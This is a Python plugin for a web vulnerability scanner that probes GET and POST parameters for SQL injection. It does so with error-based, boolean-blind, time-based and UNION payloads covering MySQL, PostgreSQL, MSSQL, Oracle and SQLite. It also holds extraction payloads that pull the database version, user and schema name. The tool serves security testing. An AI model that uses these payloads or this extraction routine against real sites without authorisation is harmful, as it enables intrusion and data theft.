"""
SQL Injection Detection Plugin

Detects SQL injection vulnerabilities using multiple techniques:
- Error-based detection (inject quote chars and detect DBMS error patterns)
- Boolean-based blind detection (compare responses for true/false conditions)
- Time-based blind detection (measure response time delta with sleep payloads)
- UNION-based detection (incrementally test UNION SELECT NULL column counts)

Covers MySQL, PostgreSQL, MSSQL, Oracle, and SQLite.

CWE-89 (Improper Neutralization of Special Elements used in an SQL Command)
"""

import logging
import re
import time
from typing import Dict, List, Any, Optional, Tuple
from urllib.parse import urlparse, parse_qs, urlencode

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    from bs4 import BeautifulSoup
    HAS_BS4 = True
except ImportError:
    HAS_BS4 = False

try:
    from sql_attacker.advanced_payloads import get_error_payloads, get_blind_payloads
    HAS_ADVANCED_PAYLOADS = True
except ImportError:
    HAS_ADVANCED_PAYLOADS = False

from scanner.scan_plugins.base_scan_plugin import BaseScanPlugin, VulnerabilityFinding

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Error patterns per DBMS
# ---------------------------------------------------------------------------

_SQL_ERROR_PATTERNS: Dict[str, List[str]] = {
    'MySQL': [
        "you have an error in your sql syntax",
        "warning: mysql_",
        "mysql_fetch_array()",
        "mysql_num_rows()",
        "supplied argument is not a valid mysql",
        "unclosed quotation mark after the character string",
        "com.mysql.jdbc.exceptions",
        "org.gjt.mm.mysql",
    ],
    'PostgreSQL': [
        "pg_query()",
        "pg_exec()",
        "pgerror",
        "pg_last_error",
        "postgresql",
        "function pg_sleep",
        "unterminated quoted string at or near",
        "syntax error at end of input",
        "invalid input syntax for type",
    ],
    'MSSQL': [
        "microsoft ole db provider for sql server",
        "odbc sql server driver",
        "unclosed quotation mark after the character string",
        "syntax error converting",
        "mssql_query()",
        "[sql server]",
        "sqlserver",
        "sqlsrv_query",
        "microsoft sql native client",
        "incorrect syntax near",
    ],
    'Oracle': [
        "ora-",
        "oracle error",
        "oracle driver",
        "oracle.jdbc",
        "quoted string not properly terminated",
        "pl/sql:",
    ],
    'SQLite': [
        "sqlite_",
        "sqlite3.",
        "sqlitedatabase",
        "[sqlite]",
        "unable to open database file",
    ],
    'Generic': [
        "sql syntax",
        "sql error",
        "database error",
        "query failed",
        "unexpected end of sql command",
        "sqlexception",
        "jdbc",
    ],
}

_ALL_ERROR_PATTERNS = [p for patterns in _SQL_ERROR_PATTERNS.values() for p in patterns]

# ---------------------------------------------------------------------------
# Payloads
# ---------------------------------------------------------------------------

_ERROR_PAYLOADS = ["'", '"', "';--", '";--', "' OR '1'='1", '" OR "1"="1']

_BOOLEAN_TRUE_SUFFIXES = ["' AND '1'='1", "' AND 1=1--", '" AND "1"="1', '" AND 1=1--']
_BOOLEAN_FALSE_SUFFIXES = ["' AND '1'='2", "' AND 1=2--", '" AND "1"="2', '" AND 1=2--']

_TIME_PAYLOADS = [
    # MySQL
    "' AND SLEEP(5)--",
    "' OR SLEEP(5)--",
    # PostgreSQL
    "'; SELECT pg_sleep(5)--",
    "' AND 1=(SELECT 1 FROM pg_sleep(5))--",
    # MSSQL
    "'; WAITFOR DELAY '0:0:5'--",
    "' WAITFOR DELAY '0:0:5'--",
    # Generic / Oracle (using heavy queries as fallback)
    "' AND 1=1 AND SLEEP(5)--",
]

_TIME_THRESHOLD = 4.0  # seconds

_REMEDIATION = (
    "Use parameterized queries (prepared statements) instead of string concatenation "
    "to build SQL queries. Apply the principle of least privilege on database accounts. "
    "Validate and sanitize all user-supplied input. Consider using an ORM. "
    "Deploy a WAF as an additional layer of defense."
)

# ---------------------------------------------------------------------------
# Data extraction payloads per DBMS
# ---------------------------------------------------------------------------

# Error-based extraction: coerce data into DBMS error messages
_EXTRACTION_ERROR_PAYLOADS: Dict[str, List[str]] = {
    'MySQL': [
        "' AND extractvalue(1,concat(0x7e,VERSION(),0x7e,USER(),0x7e,DATABASE()))--",
        "' AND updatexml(1,concat(0x7e,VERSION(),0x7e,USER(),0x7e,DATABASE()),1)--",
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),0x3a,USER(),0x3a,DATABASE(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    ],
    'PostgreSQL': [
        "' AND CAST(version() AS INTEGER)--",
        "' AND 1=CAST(version()||':'||current_user||':'||current_database() AS INTEGER)--",
    ],
    'MSSQL': [
        "' AND 1=CONVERT(INT,@@version)--",
        "' AND 1=CONVERT(INT,DB_NAME()+':'+SYSTEM_USER+':'+HOST_NAME())--",
    ],
    'Oracle': [
        "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--",
        "' AND 1=(SELECT TO_NUMBER(banner) FROM v$version WHERE ROWNUM=1)--",
    ],
    'Generic': [
        "' AND extractvalue(1,concat(0x7e,VERSION()))--",
        "' AND 1=CONVERT(INT,@@version)--",
        "' AND CAST(version() AS INTEGER)--",
    ],
}

# UNION-based extraction placeholders; %s is replaced with NULL-padded SELECT
_UNION_EXTRACTION_TEMPLATES = [
    "VERSION()",
    "USER()",
    "DATABASE()",
    "@@hostname",
    "version()",
    "current_user",
    "current_database()",
    "DB_NAME()",
]

# Patterns to extract data from error messages or UNION output
_EXTRACTION_RESULT_PATTERNS = [
    r'~([^~]+)~',                             # extractvalue / updatexml marker
    r'XPATH syntax error:\s*[\'"]([^\'"]+)',   # MySQL extractvalue error
    r'Duplicate entry\s+[\'"]([^\'"]+)',        # MySQL duplicate entry
]


class SQLiScannerPlugin(BaseScanPlugin):
    """
    SQL Injection detection plugin.

    Tests all discovered GET and POST parameters with:
    1. Error-based probes – detect DBMS-specific error messages.
    2. Boolean-based blind probes – compare true/false condition responses.
    3. Time-based blind probes – measure sleep-induced response delay.
    4. UNION-based probes – detect column-count alignment responses.
    """

    @property
    def plugin_id(self) -> str:
        return 'sqli_scanner'

    @property
    def name(self) -> str:
        return 'SQL Injection Scanner'

    @property
    def description(self) -> str:
        return (
            'Detects SQL injection vulnerabilities using error-based, boolean-based '
            'blind, time-based blind, and UNION-based detection techniques'
        )

    @property
    def version(self) -> str:
        return '1.0.0'

    @property
    def vulnerability_types(self) -> List[str]:
        return ['sqli']

    # ------------------------------------------------------------------
    # Public scan entry-point
    # ------------------------------------------------------------------

    def scan(self, url: str, config: Optional[Dict[str, Any]] = None) -> List[VulnerabilityFinding]:
        """
        Scan for SQL injection vulnerabilities.

        Args:
            url:    Target URL.
            config: Optional dict with keys:
                      verify_ssl        (bool, default False)
                      timeout           (int,  default 10)
                      test_error        (bool, default True)
                      test_boolean      (bool, default True)
                      test_time         (bool, default True)
                      test_union        (bool, default True)
                      max_union_columns (int,  default 10)

        Returns:
            List of VulnerabilityFinding instances.
        """
        if not HAS_REQUESTS:
            logger.warning("requests library not available – skipping SQLi scan")
            return []

        config = config or self.get_default_config()
        findings: List[VulnerabilityFinding] = []

        try:
            verify_ssl = config.get('verify_ssl', False)
            timeout = config.get('timeout', 10)

            parsed = urlparse(url)
            get_params = {k: v[0] for k, v in parse_qs(parsed.query).items()}
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

            # Discover POST parameters from forms if BS4 is available
            post_params = self._discover_post_params(url, verify_ssl, timeout)

            if not get_params and not post_params:
                logger.info("SQLi scan of %s – no parameters found", url)
                return findings

            # Test GET parameters
            for param in get_params:
                findings.extend(self._test_parameter(
                    base_url, 'GET', param, get_params, config
                ))

            # Test POST parameters
            for param in post_params:
                findings.extend(self._test_parameter(
                    url, 'POST', param, post_params, config
                ))

        except Exception as exc:
            logger.error("Unexpected error during SQLi scan of %s: %s", url, exc)

        logger.info("SQLi scan of %s – %d finding(s)", url, len(findings))
        return findings

    # ------------------------------------------------------------------
    # Per-parameter testing
    # ------------------------------------------------------------------

    def _test_parameter(
        self,
        url: str,
        method: str,
        param: str,
        all_params: Dict[str, str],
        config: Dict[str, Any],
    ) -> List[VulnerabilityFinding]:
        """Run all enabled SQLi techniques against a single parameter."""
        findings: List[VulnerabilityFinding] = []
        verify_ssl = config.get('verify_ssl', False)
        timeout = config.get('timeout', 10)

        if config.get('test_error', True):
            finding = self._test_error_based(url, method, param, all_params, verify_ssl, timeout)
            if finding:
                findings.append(finding)
                return findings  # confirmed – no need to run more techniques

        if config.get('test_boolean', True):
            finding = self._test_boolean_blind(url, method, param, all_params, verify_ssl, timeout)
            if finding:
                findings.append(finding)
                return findings

        if config.get('test_time', True):
            finding = self._test_time_based(
                url, method, param, all_params, verify_ssl, timeout,
                time_delta=config.get('time_test_timeout_delta', 10),
            )
            if finding:
                findings.append(finding)
                return findings

        if config.get('test_union', True):
            finding = self._test_union_based(
                url, method, param, all_params, verify_ssl, timeout,
                config.get('max_union_columns', 10)
            )
            if finding:
                findings.append(finding)

        return findings

    # ------------------------------------------------------------------
    # Error-based detection
    # ------------------------------------------------------------------

    def _test_error_based(
        self,
        url: str,
        method: str,
        param: str,
        all_params: Dict[str, str],
        verify_ssl: bool,
        timeout: int,
    ) -> Optional[VulnerabilityFinding]:
        """Inject quote characters and detect DBMS error messages."""
        for payload in _ERROR_PAYLOADS:
            test_params = dict(all_params)
            test_params[param] = payload
            try:
                response = self._send_request(url, method, test_params, verify_ssl, timeout)
            except Exception as exc:
                logger.debug("Error-based probe failed (param=%s, payload=%r): %s", param, payload, exc)
                continue

            body_lower = response.text.lower()
            for dbms, patterns in _SQL_ERROR_PATTERNS.items():
                for pattern in patterns:
                    if pattern in body_lower:
                        # Attempt data extraction to provide PoC evidence
                        extracted = self._attempt_data_extraction(
                            url, method, param, all_params, verify_ssl, timeout,
                            technique='error', dbms=dbms
                        )
                        if extracted:
                            confidence = 0.99
                            verified = True
                            evidence = (
                                f'Parameter: {param!r} | Method: {method} | '
                                f'Payload: {payload!r} | '
                                f'Error pattern matched: {pattern!r} | '
                                f'DBMS: {dbms} | '
                                f'Extracted data: {extracted}'
                            )
                            description = (
                                f'SQL injection (error-based) detected in parameter "{param}". '
                                f'DBMS error pattern for {dbms} was triggered. '
                                f'Data extraction confirmed: {extracted}. '
                                'Attack scenario: An attacker can read the database version, '
                                'user, schema names, and table data directly from error messages.'
                            )
                        else:
                            confidence = 0.90
                            verified = True
                            evidence = (
                                f'Parameter: {param!r} | Method: {method} | '
                                f'Payload: {payload!r} | '
                                f'Error pattern matched: {pattern!r} | '
                                f'DBMS: {dbms} | '
                                f'Data extraction: not confirmed (manual PoC required)'
                            )
                            description = (
                                f'SQL injection (error-based) detected in parameter "{param}". '
                                f'DBMS error pattern for {dbms} was triggered. '
                                'Attack scenario: An attacker can potentially extract database '
                                'contents. Provide a PoC that extracts database name/version '
                                'to confirm impact.'
                            )
                        return VulnerabilityFinding(
                            vulnerability_type='sqli',
                            severity='high',
                            url=url,
                            description=description,
                            evidence=evidence,
                            remediation=_REMEDIATION,
                            parameter=param,
                            confidence=confidence,
                            cwe_id='CWE-89',
                            verified=verified,
                            successful_payloads=[payload],
                        )
        return None

    # ------------------------------------------------------------------
    # Boolean-based blind detection
    # ------------------------------------------------------------------

    def _test_boolean_blind(
        self,
        url: str,
        method: str,
        param: str,
        all_params: Dict[str, str],
        verify_ssl: bool,
        timeout: int,
    ) -> Optional[VulnerabilityFinding]:
        """Compare responses for true vs false SQL conditions."""
        baseline_params = dict(all_params)
        try:
            baseline = self._send_request(url, method, baseline_params, verify_ssl, timeout)
        except Exception:
            return None

        for true_suffix, false_suffix in zip(_BOOLEAN_TRUE_SUFFIXES, _BOOLEAN_FALSE_SUFFIXES):
            true_params = dict(all_params)
            true_params[param] = all_params.get(param, '1') + true_suffix
            false_params = dict(all_params)
            false_params[param] = all_params.get(param, '1') + false_suffix

            try:
                true_response = self._send_request(url, method, true_params, verify_ssl, timeout)
                false_response = self._send_request(url, method, false_params, verify_ssl, timeout)
            except Exception:
                continue

            baseline_len = len(baseline.text)
            true_len = len(true_response.text)
            false_len = len(false_response.text)

            # True condition should match baseline; false condition should differ
            true_matches_baseline = abs(true_len - baseline_len) < max(50, baseline_len * 0.05)
            false_differs = abs(false_len - true_len) > max(50, true_len * 0.05)

            if true_matches_baseline and false_differs:
                return VulnerabilityFinding(
                    vulnerability_type='sqli',
                    severity='high',
                    url=url,
                    description=(
                        f'SQL injection (boolean-based blind) detected in parameter "{param}". '
                        'Response differs between true and false SQL conditions.'
                    ),
                    evidence=(
                        f'Parameter: {param!r} | Method: {method} | '
                        f'True payload: {true_suffix!r} (response len: {true_len}) | '
                        f'False payload: {false_suffix!r} (response len: {false_len}) | '
                        f'Baseline len: {baseline_len}'
                    ),
                    remediation=_REMEDIATION,
                    parameter=param,
                    confidence=0.80,
                    cwe_id='CWE-89',
                    successful_payloads=[true_suffix, false_suffix],
                )
        return None

    # ------------------------------------------------------------------
    # Time-based blind detection
    # ------------------------------------------------------------------

    def _test_time_based(
        self,
        url: str,
        method: str,
        param: str,
        all_params: Dict[str, str],
        verify_ssl: bool,
        timeout: int,
        time_delta: int = 10,
    ) -> Optional[VulnerabilityFinding]:
        """Inject sleep payloads and measure response time delta."""
        for payload in _TIME_PAYLOADS:
            test_params = dict(all_params)
            test_params[param] = all_params.get(param, '1') + payload
            try:
                start = time.monotonic()
                self._send_request(url, method, test_params, verify_ssl, timeout + time_delta)
                elapsed = time.monotonic() - start
            except Exception:
                continue

            if elapsed >= _TIME_THRESHOLD:
                return VulnerabilityFinding(
                    vulnerability_type='sqli',
                    severity='critical',
                    url=url,
                    description=(
                        f'SQL injection (time-based blind) detected in parameter "{param}". '
                        f'Response was delayed by {elapsed:.1f}s after injecting sleep payload.'
                    ),
                    evidence=(
                        f'Parameter: {param!r} | Method: {method} | '
                        f'Payload: {payload!r} | '
                        f'Response time: {elapsed:.2f}s (threshold: {_TIME_THRESHOLD}s)'
                    ),
                    remediation=_REMEDIATION,
                    parameter=param,
                    confidence=0.85,
                    cwe_id='CWE-89',
                    successful_payloads=[payload],
                )
        return None

    # ------------------------------------------------------------------
    # UNION-based detection
    # ------------------------------------------------------------------

    def _test_union_based(
        self,
        url: str,
        method: str,
        param: str,
        all_params: Dict[str, str],
        verify_ssl: bool,
        timeout: int,
        max_columns: int,
    ) -> Optional[VulnerabilityFinding]:
        """Incrementally test UNION SELECT NULL payloads for column count alignment."""
        for col_count in range(1, max_columns + 1):
            nulls = ','.join(['NULL'] * col_count)
            payload = f"' UNION SELECT {nulls}--"
            test_params = dict(all_params)
            test_params[param] = all_params.get(param, '1') + payload
            try:
                response = self._send_request(url, method, test_params, verify_ssl, timeout)
            except Exception:
                continue

            body_lower = response.text.lower()
            # Check if the response has fewer/no error signs and returns data
            has_error = any(p in body_lower for p in _ALL_ERROR_PATTERNS)
            if not has_error and response.status_code == 200 and len(response.text) > 100:
                # Check previous column count to see if errors were present
                if col_count > 1:
                    prev_payload = f"' UNION SELECT {','.join(['NULL'] * (col_count - 1))}--"
                    prev_params = dict(all_params)
                    prev_params[param] = all_params.get(param, '1') + prev_payload
                    try:
                        prev_response = self._send_request(url, method, prev_params, verify_ssl, timeout)
                        prev_has_error = any(p in prev_response.text.lower() for p in _ALL_ERROR_PATTERNS)
                        if not prev_has_error:
                            continue  # No column count transition detected
                    except Exception:
                        pass

                # Attempt data extraction using the discovered column count
                extracted = self._attempt_data_extraction(
                    url, method, param, all_params, verify_ssl, timeout,
                    technique='union', col_count=col_count
                )
                if extracted:
                    confidence = 0.99
                    verified = True
                    evidence = (
                        f'Parameter: {param!r} | Method: {method} | '
                        f'Payload: {payload!r} | '
                        f'Column count: {col_count} | '
                        f'Response status: {response.status_code} | '
                        f'Extracted data: {extracted}'
                    )
                    description = (
                        f'SQL injection (UNION-based) detected in parameter "{param}". '
                        f'UNION SELECT with {col_count} column(s) returned a valid response. '
                        f'Data extraction confirmed: {extracted}. '
                        'Attack scenario: An attacker can extract any data from the database '
                        'including user credentials, sensitive records, and schema information.'
                    )
                else:
                    confidence = 0.75
                    verified = False
                    evidence = (
                        f'Parameter: {param!r} | Method: {method} | '
                        f'Payload: {payload!r} | '
                        f'Column count: {col_count} | '
                        f'Response status: {response.status_code} | '
                        f'Data extraction: not confirmed (manual PoC required)'
                    )
                    description = (
                        f'SQL injection (UNION-based) detected in parameter "{param}". '
                        f'UNION SELECT with {col_count} column(s) returned a valid response. '
                        'Attack scenario: An attacker can potentially extract database contents '
                        'using UNION SELECT. Provide a PoC extracting database name/version '
                        'to confirm impact.'
                    )
                return VulnerabilityFinding(
                    vulnerability_type='sqli',
                    severity='critical',
                    url=url,
                    description=description,
                    evidence=evidence,
                    remediation=_REMEDIATION,
                    parameter=param,
                    confidence=confidence,
                    cwe_id='CWE-89',
                    verified=verified,
                    successful_payloads=[payload],
                )
        return None

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    def _attempt_data_extraction(
        self,
        url: str,
        method: str,
        param: str,
        all_params: Dict[str, str],
        verify_ssl: bool,
        timeout: int,
        technique: str = 'error',
        dbms: str = 'Generic',
        col_count: int = 1,
    ) -> Optional[str]:
        """
        Attempt to extract database metadata (version, user, database name) via
        error-based or UNION-based payloads after a confirmed injection point.

        Returns a human-readable string of extracted data (e.g.
        "Database: mysql 8.0.32 | User: app_user@localhost | DB: production_db")
        or None if extraction was not possible.
        """
        extracted_parts: List[str] = []

        if technique == 'error':
            payloads = (
                _EXTRACTION_ERROR_PAYLOADS.get(dbms, [])
                + _EXTRACTION_ERROR_PAYLOADS.get('Generic', [])
            )
            for payload in payloads:
                test_params = dict(all_params)
                test_params[param] = payload
                try:
                    response = self._send_request(url, method, test_params, verify_ssl, timeout)
                except Exception:
                    continue
                for pat in _EXTRACTION_RESULT_PATTERNS:
                    matches = re.findall(pat, response.text, re.IGNORECASE)
                    for match in matches:
                        match = match.strip()
                        if match and match not in extracted_parts:
                            extracted_parts.append(match)
                if extracted_parts:
                    break

        elif technique == 'union':
            # Build UNION SELECT with version/user/db in first available string columns
            extraction_values = ['VERSION()', 'USER()', 'DATABASE()']
            for extract_expr in extraction_values:
                cols = ['NULL'] * col_count
                # Replace first NULL with extraction expression
                cols[0] = extract_expr
                union_payload = f"' UNION SELECT {','.join(cols)}--"
                test_params = dict(all_params)
                test_params[param] = all_params.get(param, '1') + union_payload
                try:
                    response = self._send_request(url, method, test_params, verify_ssl, timeout)
                except Exception:
                    continue
                # Check for version/user strings in response
                text = response.text
                version_match = re.search(
                    r'\b(\d+\.\d+[\.\d]*(?:-[a-zA-Z0-9._-]+)?)\b', text
                )
                if version_match and version_match.group(1) not in extracted_parts:
                    extracted_parts.append(version_match.group(1))

        if extracted_parts:
            labels = ['Database version/user/name: ' + ' | '.join(extracted_parts[:5])]
            return ' | '.join(labels)

        return None

    def _send_request(
        self,
        url: str,
        method: str,
        params: Dict[str, str],
        verify_ssl: bool,
        timeout: int,
    ) -> 'requests.Response':
        """Send GET or POST request with the given parameters."""
        if method == 'POST':
            return requests.post(url, data=params, timeout=timeout, verify=verify_ssl)
        return requests.get(url, params=params, timeout=timeout, verify=verify_ssl)

    def _discover_post_params(
        self, url: str, verify_ssl: bool, timeout: int
    ) -> Dict[str, str]:
        """Attempt to extract POST form parameters from the page HTML."""
        if not HAS_BS4:
            return {}
        try:
            response = requests.get(url, timeout=timeout, verify=verify_ssl)
            soup = BeautifulSoup(response.text, 'html.parser')
            params: Dict[str, str] = {}
            for form in soup.find_all('form'):
                if form.get('method', 'GET').upper() == 'POST':
                    for inp in form.find_all('input'):
                        name = inp.get('name')
                        if name:
                            params[name] = inp.get('value', 'test')
            return params
        except Exception:
            return {}

    def get_default_config(self) -> Dict[str, Any]:
        """Return default configuration for SQL injection scanning."""
        return {
            'verify_ssl': False,
            'timeout': 10,
            'test_error': True,
            'test_boolean': True,
            'test_time': True,
            'test_union': True,
            'max_union_columns': 10,
            'time_test_timeout_delta': 10,
        }
